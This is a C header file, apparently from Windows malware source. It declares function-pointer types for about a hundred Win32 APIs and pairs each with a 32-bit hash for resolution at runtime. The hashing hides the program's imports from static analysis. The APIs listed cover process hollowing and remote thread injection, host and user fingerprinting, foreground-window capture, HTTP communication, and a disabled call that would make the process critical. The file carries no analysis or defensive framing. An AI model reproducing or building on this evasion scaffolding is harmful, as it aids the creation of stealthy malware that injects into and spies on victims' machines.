#pragma once
#include "Common.h"

//----------PROTOTYPES----------
typedef BOOL (WINAPI* T_VirtualProtect)(LPVOID lpAddress,SIZE_T dwSize,DWORD flNewProtect,PDWORD lpflOldProtect);
typedef BOOL (WINAPI* T_InternetQueryDataAvailable)(HINTERNET hFile,LPDWORD lpdwNumberOfBytesAvailable,DWORD dwFlags,
	DWORD_PTR dwContext);
typedef int (WINAPI* T_lstrlenW)(LPCWSTR lpString);
typedef int (WINAPI* T_lstrcmpW)(LPCWSTR lpString1,LPCWSTR lpString2);
typedef int (WINAPI* T_GetWindowTextW)(HWND hWnd,LPWSTR lpString,int nMaxCount);
typedef HWND (WINAPI* T_GetForegroundWindow)();
typedef BOOL(WINAPI* T_GetUserNameW)(PWCHAR  lpBuffer,LPDWORD lpnSize);
typedef BOOL(WINAPI* T_GetComputerNameW)(PWCHAR  lpBuffer,LPDWORD lpnSize);
typedef int (WINAPI* T_WideCharToMultiByte)(UINT CodePage,DWORD dwFlags,LPCWCH lpWideCharStr,int cchWideChar,LPSTR lpMultiByteStr,
	int cbMultiByte,LPCCH lpDefaultChar,LPBOOL lpUsedDefaultChar);
typedef LCID (WINAPI* T_GetSystemDefaultLCID)();
typedef int (WINAPI* T_GetLocaleInfoW)(LCID Locale,LCTYPE LCType,LPWSTR lpLCData,int cchData);
typedef void (WINAPI* T_GetLocalTime)(LPSYSTEMTIME lpSystemTime);
typedef BOOL (WINAPI* T_GetTokenInformation)(HANDLE TokenHandle,TOKEN_INFORMATION_CLASS TokenInformationClass,LPVOID TokenInformation,
	DWORD TokenInformationLength,PDWORD ReturnLength);
typedef HANDLE(WINAPI* T_GetCurrentProcess)();
typedef BOOL (WINAPI* T_OpenProcessToken)(HANDLE ProcessHandle,DWORD DesiredAccess,PHANDLE TokenHandle);
typedef BOOL (WINAPI* T_GetComputerNameA)(LPSTR lpBuffer,LPDWORD nSize);
typedef BOOL (WINAPI* T_GetUserNameA)(LPSTR lpBuffer,LPDWORD pcbBuffer);
typedef BOOL (WINAPI* T_GetWindowRect)(HWND hWnd,LPRECT lpRect);
typedef HWND (WINAPI* T_GetDesktopWindow)();
typedef DWORD (WINAPI* T_GetLogicalDrives)();
typedef BOOL (WINAPI* T_GlobalMemoryStatusEx)(LPMEMORYSTATUSEX lpBuffer);
typedef BOOL (WINAPI* T_EnumDisplayDevicesW)(LPCWSTR lpDevice,DWORD iDevNum,PDISPLAY_DEVICEW lpDisplayDevice,DWORD dwFlags);
typedef LPSTR (WINAPI* T_lstrcatW)(LPWSTR lpString1,LPCWSTR lpString2);
typedef DWORD (WINAPI* T_GetLastError)();
typedef HANDLE (WINAPI* T_CreateMutexW)(LPSECURITY_ATTRIBUTES lpMutexAttributes,BOOL bInitialOwner,LPCWSTR lpName);
typedef BOOL (WINAPI* T_MoveFileW)(LPCWSTR lpExistingFileName,LPCWSTR lpNewFileName);
//typedef VOID(WINAPI* T_RtlSetProcessIsCritical)(BOOLEAN NewValue,PBOOLEAN OldValue,BOOLEAN IsWinlogon);
typedef int (WINAPI* T_MultiByteToWideChar)(UINT CodePage,DWORD dwFlags,_In_NLS_string_(cbMultiByte)LPCCH lpMultiByteStr,int cbMultiByte,
	LPWSTR lpWideCharStr,int cchWideChar);
typedef BOOL (WINAPI* T_SHGetSpecialFolderPathW)(HWND hwnd,LPWSTR pszPath,int csidl,BOOL fCreate);
typedef void (WINAPI* T_CoUninitialize)();
typedef HRESULT (WINAPI* T_CoCreateInstance)(REFCLSID rclsid,LPUNKNOWN pUnkOuter,DWORD dwClsContext,REFIID riid,LPVOID* ppv);
typedef HRESULT (WINAPI* T_CoInitialize)(LPVOID pvReserved);
typedef void* (WINAPI* T_calloc)(size_t number,size_t size);
typedef DWORD(WINAPI* T_GetCurrentProcessId)();
typedef BOOL (WINAPI* T_GetVersionExA)(LPOSVERSIONINFOA lpVersionInformation);
typedef int (WINAPI* T_MessageBoxA)(HWND hWnd,PCHAR lpText,PCHAR lpCaption,UINT uType);
typedef DWORD (WINAPI* T_ResumeThread)(HANDLE hThread);
typedef BOOL (WINAPI* T_SetThreadContext)(HANDLE hThread,const CONTEXT* lpContext);
typedef BOOL (WINAPI* T_ReadProcessMemory)(HANDLE hProcess,LPCVOID lpBaseAddress,LPVOID lpBuffer,SIZE_T nSize,
	SIZE_T* lpNumberOfBytesRead);
typedef BOOL (WINAPI* T_GetThreadContext)(HANDLE hThread,LPCONTEXT lpContext);
typedef BOOL (WINAPI* T_CreateProcessA)(LPCSTR lpApplicationName,LPSTR lpCommandLine,LPSECURITY_ATTRIBUTES lpProcessAttributes,
    LPSECURITY_ATTRIBUTES lpThreadAttributes,BOOL bInheritHandles,DWORD dwCreationFlags,LPVOID lpEnvironment,
    LPCSTR lpCurrentDirectory,LPSTARTUPINFOA lpStartupInfo,LPPROCESS_INFORMATION lpProcessInformation);
/*typedef BOOL (WINAPI* T_DisconnectNamedPipe)(HANDLE hNamedPipe);
typedef BOOL (WINAPI* T_ConnectNamedPipe)(HANDLE hNamedPipe,LPOVERLAPPED lpOverlapped);
typedef HANDLE (WINAPI* T_CreateNamedPipeA)(LPCSTR lpName,DWORD dwOpenMode,DWORD dwPipeMode,DWORD nMaxInstances,
	DWORD nOutBufferSize,DWORD nInBufferSize,DWORD nDefaultTimeOut,LPSECURITY_ATTRIBUTES lpSecurityAttributes);*/
typedef BOOL (WINAPI* T_Thread32Next)(HANDLE hSnapshot,LPTHREADENTRY32 lpte);
typedef BOOL (WINAPI* T_Thread32First)(HANDLE hSnapshot,LPTHREADENTRY32 lpte);
typedef DWORD (WINAPI* T_GetFileAttributesA)(LPCSTR lpFileName);
typedef void (WINAPI* T_ExitThread)(DWORD dwExitCode);
typedef BOOL(WINAPI* T_HttpQueryInfoW)(HINTERNET hRequest, DWORD dwInfoLevel, LPVOID lpvBuffer, LPDWORD lpdwBufferLength, LPDWORD lpdwIndex);
typedef void(WINAPI* T_free)(void* memblock);
typedef void* (WINAPI* T_malloc)(size_t size);
typedef void* (WINAPI* T_memset)(void* dest,int c,size_t count);
typedef void* (WINAPI* T_memcpy)(void* dest,const void* src,size_t count);
typedef BOOL (WINAPI* T_InternetCloseHandle)(HINTERNET hInternet);
typedef BOOL (WINAPI* T_InternetReadFile)(HINTERNET hFile,LPVOID lpBuffer,DWORD dwNumberOfBytesToRead,LPDWORD lpdwNumberOfBytesRead);
typedef BOOL (WINAPI* T_HttpSendRequestW)(HINTERNET hRequest,LPCWSTR lpszHeaders,DWORD dwHeadersLength,LPVOID lpOptional,DWORD dwOptionalLength);
typedef HINTERNET (WINAPI* T_HttpOpenRequestW)(HINTERNET hConnect,LPCWSTR lpszVerb,LPCWSTR lpszObjectName,LPCWSTR lpszVersion,LPCWSTR lpszReferrer,
	LPCWSTR* lplpszAcceptTypes,DWORD dwFlags,DWORD_PTR dwContext);
typedef HINTERNET(WINAPI* T_InternetConnectW)(HINTERNET hInternet,LPCWSTR lpszServerName,INTERNET_PORT nServerPort,LPCWSTR lpszUserName,LPCWSTR lpszPassword,
	DWORD dwService,DWORD dwFlags,DWORD_PTR dwContext);
typedef HINTERNET(WINAPI* T_InternetOpenW)(LPCWSTR lpszAgent,DWORD  dwAccessType,LPCWSTR lpszProxy,LPCWSTR lpszProxyBypass,DWORD  dwFlags);
typedef UINT(WINAPI* T_GetWindowsDirectoryW)(LPCWSTR lpBuffer, UINT uSize);
typedef BOOL(WINAPI* T_GetVolumeInformationW)(LPCWSTR lpRootPathName, LPCWSTR lpVolumeNameBuffer, DWORD nVolumeNameSize,
	LPDWORD lpVolumeSerialNumber, LPDWORD lpMaximumComponentLength, LPDWORD lpFileSystemFlags, LPCWSTR lpFileSystemNameBuffer, DWORD nFileSystemNameSize);
typedef NTSTATUS(WINAPI* T_ZwAllocateVirtualMemory)(HANDLE ProcessHandle,PVOID* BaseAddress,ULONG ZeroBits,
	PSIZE_T RegionSize,ULONG AllocationType,ULONG Protect);
typedef BOOL(WINAPI* T_Process32Next)(HANDLE hSnapshot, LPPROCESSENTRY32 lppe);
typedef BOOL(WINAPI* T_Process32First)(HANDLE hSnapshot, LPPROCESSENTRY32 lppe);
typedef HANDLE(WINAPI* T_CreateToolhelp32Snapshot)(DWORD dwFlags, DWORD th32ProcessID);
typedef BOOL(WINAPI* T_VirtualFreeEx)(HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD  dwFreeType);
typedef DWORD(WINAPI* T_WaitForSingleObject)(HANDLE hHandle, DWORD  dwMilliseconds);
typedef HANDLE(WINAPI* T_CreateRemoteThread)(HANDLE hProcess, LPSECURITY_ATTRIBUTES  lpThreadAttributes, SIZE_T dwStackSize,
	LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, DWORD  dwCreationFlags, LPDWORD lpThreadId);
typedef BOOL(WINAPI* T_WriteProcessMemory)(HANDLE hProcess, LPVOID lpBaseAddress, LPCVOID lpBuffer, SIZE_T nSize, SIZE_T* lpNumberOfBytesWritten);
typedef LPVOID(WINAPI* T_VirtualAllocEx)(HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
typedef HANDLE(WINAPI* T_OpenProcess)(DWORD dwDesiredAccess, BOOL bInheritHandle, DWORD dwProcessId);
typedef BOOL(WINAPI* T_ReadFile)(HANDLE hFile, LPVOID lpBuffer, DWORD nNumberOfBytesToRead, LPDWORD lpNumberOfBytesRead, LPOVERLAPPED lpOverlapped);
typedef LPVOID(WINAPI* T_VirtualAlloc)(LPVOID lpAddress, SIZE_T dwSize, DWORD  flAllocationType, DWORD  flProtect);
typedef DWORD(WINAPI* T_GetFileSize)(HANDLE hFile, LPDWORD lpFileSizeHigh);
typedef HLOCAL(WINAPI* T_LocalAlloc)(UINT uFlags, SIZE_T uBytes);
typedef DWORD(WINAPI* T_GetModuleFileNameW)(HMODULE hModule, LPWSTR lpFilename, DWORD nSize);
typedef VOID(WINAPI* T_ExitProcess)(UINT uExitCode);
typedef BOOL(WINAPI* T_CloseHandle)(HANDLE hObject);
typedef HANDLE(WINAPI* T_CreateFileW)(LPCWSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes,
	DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile);
typedef BOOL(WINAPI* T_WriteFile)(HANDLE hFile, LPCVOID lpBuffer, DWORD nNumberOfBytesToWrite, LPDWORD lpNumberOfBytesWritten,
	LPOVERLAPPED lpOverlapped);
typedef void (WINAPI* T_GetNativeSystemInfo)(LPSYSTEM_INFO lpSystemInfo);
typedef HANDLE(WINAPI* T_CreateThread)(LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress,
	LPVOID lpParameter, DWORD dwCreationFlags, LPDWORD lpThreadId);
typedef DWORD(WINAPI* T_GetTempPathW)(DWORD nBufferLength, LPWSTR lpBuffer);
typedef UINT(WINAPI* T_GetTempFileNameW)(LPWSTR lpPathName, LPCWSTR lpPrefixString, UINT uUnique, LPWSTR lpTempFileName);
typedef BOOL(WINAPI* T_CreateDirectoryW)(LPCWSTR lpPathName, LPSECURITY_ATTRIBUTES lpSecurityAttributes);
typedef int (WINAPI* T_MessageBoxW)(HWND hWnd, LPCWSTR lpText, LPCWSTR lpCaption, UINT uType);
typedef int(__cdecl* T_wsprintfW)(LPCWSTR lpOut, LPCWSTR lpFmt, ...);
typedef void* (_cdecl* T_realloc)(void* memblock, size_t size);
typedef PCHAR(WINAPI* T_PathFindFileNameA)(PCHAR pPath);
typedef HRESULT(WINAPI* T_SHGetFolderPathW)(HWND hwndOwner, int nFolder, HANDLE hToken, DWORD dwFlags, LPCWSTR pszPath);
typedef HINSTANCE(WINAPI* T_ShellExecuteW)(HWND hwnd, LPCWSTR lpOperation, LPWSTR lpFile, LPWSTR lpParameters, 
	LPWSTR lpDirectory, INT nShowCmd);
typedef VOID(WINAPI* T_Sleep)(DWORD dwMilliseconds);
typedef BOOL(WINAPI* T_InternetCrackUrlA)(PCHAR lpszUrl, DWORD dwUrlLength, DWORD dwFlags, LPURL_COMPONENTSA lpUrlComponents);
typedef HMODULE(WINAPI* T_LoadLibraryA)(PCHAR lpFileName);
typedef HMODULE(WINAPI* T_LoadLibraryW)(LPWSTR lpFileName);
typedef FARPROC(WINAPI* T_GetProcAddress)(HMODULE hModule, LPCSTR lpProcName);
//----------PROTOTYPES----------

//----------FUNC_HASH----------
#define hashVirtualProtect 0x072d1864
#define hashInternetQueryDataAvailable 0x016f79f5
#define hashlstrlenW 0x0ab92d07
#define hashlstrcmpW 0x0ab8a367
#define hashGetWindowTextW 0x0a54cf17
#define hashGetForegroundWindow 0x0ffff5e7
#define hashGetUserNameW 0x08c8ff37
#define hashGetComputerNameW 0x0614e387
#define hashWideCharToMultiByte 0x062c3db5
#define hashGetSystemDefaultLCID 0x04bab524
#define hashGetLocaleInfoW 0x0e0d12f7
#define hashGetLocalTime 0x0dbd3d65
#define hashGetTokenInformation 0x0df551e
#define hashGetCurrentProcess 0x0b601193
#define hashOpenProcessToken 0x09f57ebe
#define hashGetComputerNameA 0x0614e3b1
#define hashGetUserNameA 0x08c8ff01
#define hashGetWindowRect 0x08a56ba4
#define hashGetDesktopWindow 0x0f12be87
#define hashGetLogicalDrives 0x03e22933
#define hashGlobalMemoryStatusEx 0x03f5dcb8
#define hashEnumDisplayDevicesW 0x0a810a67
#define hashlstrcatW 0x0ab89fa7
#define hashGetLastError 0x0e500be2
#define hashCreateMutexW 0x0ee41477
#define hashMoveFileW 0x0c9cb6c7
//#define hashRtlSetProcessIsCritical 0x0960badc
#define hashMultiByteToWideChar 0x0bc08782
#define hashSHGetSpecialFolderPathW 0x0388bc47
#define hashCoUninitialize 0x0e3332a5
#define hashCoCreateInstance 0x0d168ef5
#define hashCoInitialize 0x0e543605
#define hashcalloc 0x06983353
#define hashGetCurrentProcessId 0x0119c94
#define hashGetVersionExA 0x044de011
#define hashMessageBoxA 0x078a5c51
#define hashResumeThread 0x0f232744
#define hashSetThreadContext 0x04b887e4
#define hashReadProcessMemory 0x01d72da9
#define hashGetThreadContext 0x04b9c7e4
#define hashCreateProcessA 0x01e164a1
/*#define hashDisconnectNamedPipe 0x0c0a6215
#define hashConnectNamedPipe 0x07076255
#define hashCreateNamedPipeA 0x0339f611*/
#define hashThread32Next 0x02cac784
#define hashThread32First 0x0c95be84
#define hashGetFileAttributesA 0x09d89af1
#define hashExitThread 0x09ab4474
#define hashHttpQueryInfoW 0x026bc477
#define hashfree 0x06d8b5
#define hashmalloc 0x07383353
#define hashmemset 0x073c49c4
#define hashmemcpy 0x073c3a79
#define hashInternetCloseHandle 0x0534b6a5
#define hashInternetReadFile 0x07e90405
#define hashHttpSendRequestW 0x092b78a7
#define hashHttpOpenRequestW 0x09e992a7
#define hashInternetConnectW 0x0ae577d7
#define hashInternetOpenW 0x0ceca327
#define hashGetWindowsDirectoryW 0x01d4d9e7
#define hashGetVolumeInformationW 0x03b845b7
#define hashZwAllocateVirtualMemory 0x010bcf79
#define hashProcess32Next 0x01f4d004
#define hashProcess32First 0x0f36c6b4
#define hashCreateToolhelp32Snapshot 0x02aa0484
#define hashVirtualFreeEx 0x0dd102f8
#define hashWaitForSingleObject 0x0479cab4
#define hashCreateRemoteThread 0x048b1574
#define hashWriteProcessMemory 0x0648b099
#define hashVirtualAllocEx 0x08cae418
#define hashOpenProcess 0x07e3f093
#define hashReadFile 0x0b78cba5
#define hashVirtualAlloc 0x03d8cae3
#define hashGetFileSize 0x06769d5
#define hashGetModuleFileNameW 0x0dfa8b17
#define hashExitProcess 0x07d96c33
#define hashSleep 0x05a2bc0
#define hashCreateProcessA 0x01e164a1
#define hashCloseHandle 0x09ae7db5
#define hashCreateFileW 0x0ad68927
#define hashWriteFile 0x0a992b5
#define hashGetNativeSystemInfo 0x07c21c9f
#define hashCreateThread 0x0e0733d4
#define hashGetTempPathW 0x08a1017
#define hashGetTempFileNameW 0x0864f3d7
#define hashCreateDirectoryW 0x030871d7
#define hashMessageBoxA 0x078a5c51
#define hashwsprintfW 0x07902417
#define hashrealloc 0x08b83323
#define hashPathFindFileNameA 0x0e3685d1
#define hashSHGetFolderPathW 0x0fcb4a7
#define hashShellExecuteW 0x0756fa37 //
#define hashLoadLibraryA 0x0aadf0f1
#define hashLoadLibraryW 0x0aadf0c7
#define hashGetProcAddress 0x0b3c1d03
//----------FUNC_HASH----------

